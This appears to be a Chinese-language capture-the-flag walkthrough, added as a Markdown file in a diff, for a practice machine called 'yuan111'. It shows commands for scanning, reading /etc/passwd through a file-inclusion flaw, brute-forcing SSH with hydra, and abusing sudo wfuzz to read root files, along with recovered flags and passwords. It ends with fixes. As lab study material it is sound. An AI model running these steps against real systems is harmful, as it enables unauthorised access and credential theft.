@@ -1,0 +1,199 @@
+---
+title: 1. yuan111
+sidebar_position: 2
+---
+
+# 靶机记录 — yuan111
+
+## 环境信息
+
+| 项目 | 详情 |
+|------|------|
+| 靶机 IP | 192.168.2.206 |
+| 攻击机 | Kali Linux |
+| 靶机系统 | Debian 11 |
+| 目标 | 获取 user.txt 和 root.txt |
+
+---
+
+## 一、信息收集
+
+### 1.1 端口扫描
+
+使用 RustScan + Nmap 进行快速端口发现和服务识别：
+
+```shell
+rustscan -a 192.168.2.206 -- -sV -sC
+```
+
+扫描结果显示开放了 **22**（SSH）和 **80**（HTTP）两个端口：
+
+| 端口 | 服务 | 版本 |
+|------|------|------|
+| 22/tcp | SSH | OpenSSH 8.4p1 (Debian 5+deb11u3) |
+| 80/tcp | HTTP | Apache httpd 2.4.62 (Debian) |
+
+80 端口首页标题为「Rockyou.txt - 密码字典文件介绍」，暗示靶机可能在某个环节涉及 `rockyou.txt` 这个经典密码字典。
+
+### 1.2 Web 目录枚举
+
+使用 feroxbuster 对 Web 根目录进行扫描：
+
+```shell
+feroxbuster -u http://192.168.2.206 -w /usr/share/wordlists/dirb/big.txt \
+    -x php,html,txt,bak,zip -t 50 --depth 2
+```
+
+发现的资源：
+
+| 路径 | 状态码 | 说明 |
+|------|--------|------|
+| `/` | 200 | 首页 — Rockyou.txt 介绍页面 |
+| `/index.html` | 200 | 同上 |
+| `/file.php` | 200 | 空页面，高度可疑 |
+
+`file.php` 返回了 200 状态码但内容为空，这种「空白 PHP 文件」往往是文件包含漏洞的典型特征 — 它可能通过 GET 参数动态加载内容。
+
+### 1.3 文件包含漏洞（LFI）
+
+对 `file.php` 的 `file` 参数进行测试，发现存在 **本地文件包含（Local File Inclusion）** 漏洞：
+
+```shell
+curl "http://192.168.2.206/file.php?file=/etc/passwd"
+```
+
+成功读取到 `/etc/passwd`，从中提取到一个普通用户：
+
+```
+tao:x:1000:1000:,,,:/home/tao:/bin/bash
+```
+
+> **关键信息**：用户名 `tao`，拥有登录 Shell。
+
+---
+
+## 二、漏洞利用 — SSH 爆破
+
+有了用户名，结合首页暗示的 `rockyou.txt` 字典，对 SSH 进行弱口令爆破：
+
+```shell
+hydra -l tao -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.206 -t 4
+```
+
+不到 10 秒即爆破成功，获得凭据：
+
+```
+tao : rockyou
+```
+
+> 这印证了首页对 `rockyou.txt` 的介绍 — 靶机设计者故意使用字典中的第一个单词作为密码。
+
+### 2.1 获取 user flag
+
+```shell
+ssh tao@192.168.2.206
+cat user.txt
+```
+
+```
+flag{user-21747e1ca09bfcc4f2551263db0f3dff}
+```
+
+---
+
+## 三、权限提升
+
+### 3.1 sudo 权限分析
+
+登录后首先检查当前用户的 sudo 权限：
+
+```shell
+sudo -l
+```
+
+输出：
+
+```
+User tao may run the following commands on 111:
+    (ALL) NOPASSWD: /usr/bin/wfuzz
+    (ALL) NOPASSWD: /usr/bin/id
+```
+
+**分析**：
+
+- `(ALL)` — 可以以任意用户（包括 root）身份执行
+- `NOPASSWD` — 无需输入密码
+- `wfuzz` 是一个 Web Fuzzer 工具，支持多种 payload 生成方式，其中 **`file` payload 可以读取任意文件内容**，**`dirwalk` payload 可以枚举目录**。这两个功能在 root 权限下执行时，即可越权访问 `/root` 下的敏感文件。
+
+### 3.2 利用 file payload 读取 root flag
+
+`-w` 参数本质是 `-z file,<wordlist>` 的简写，`file` payload 会按行读取指定文件的内容。结合 `--dry-run`（不发送实际 HTTP 请求，仅打印 payload），可以直接泄密文件内容：
+
+```shell
+sudo wfuzz -u "http://127.0.0.1/FUZZ" -w /root/root.txt --dry-run
+```
+
+```
+flag{root-9bbd7af2a042a901b92dc203b3896621}
+```
+
+直接拿到 root flag ✅
+
+### 3.3 利用 dirwalk payload 枚举 root 目录
+
+`dirwalk` payload 内部调用 `os.walk()` / `os.listdir()` 遍历目录结构，同样结合 `--dry-run` 实现信息收集：
+
+```shell
+sudo /usr/bin/wfuzz -z dirwalk,/root -u http://localhost/FUZZ --dry-run 2>/dev/null
+```
+
+枚举结果：
+
+```
+root.txt
+111.txt
+.bashrc
+.bash_history
+.profile
+.viminfo
+.config/wfuzz/wfuzz.ini
+```
+
+发现额外的敏感文件 `111.txt`。
+
+### 3.4 读取 root 密码文件
+
+```shell
+sudo wfuzz -u "http://127.0.0.1/FUZZ" -w /root/111.txt --dry-run
+```
+
+获得 root 密码：
+
+```
+q6I42RCMyMkDV45svyuF
+```
+
+---
+
+## 四、漏洞原理总结
+
+| 阶段 | 漏洞/问题 | 说明 |
+|------|-----------|------|
+| 信息收集 | 信息泄露 | `file.php` 未过滤用户输入，导致 LFI，泄露 `/etc/passwd` 中的用户名 |
+| SSH 爆破 | 弱密码 | 用户 `tao` 的密码 `rockyou` 出现在常见字典第一位 |
+| 权限提升 | sudo 配置不当 | `wfuzz` 被赋予 `(ALL) NOPASSWD` 权限，其 `file` / `dirwalk` payload 可越权读取任意 root 文件 |
+
+**修复建议**：
+
+1. `file.php` 应对 `file` 参数做白名单校验，禁止目录穿越（`../`、绝对路径）
+2. 强制使用强密码策略，禁用常见字典中的弱口令
+3. `sudoers` 中应避免为具有文件读取能力的工具赋予 `NOPASSWD: ALL`，如需使用应限定具体命令参数
+
+---
+
+## 最终 Flag
+
+| 类型 | Flag |
+|------|------|
+| user | `flag{user-21747e1ca09bfcc4f2551263db0f3dff}` |
+| root | `flag{root-9bbd7af2a042a901b92dc203b3896621}` |
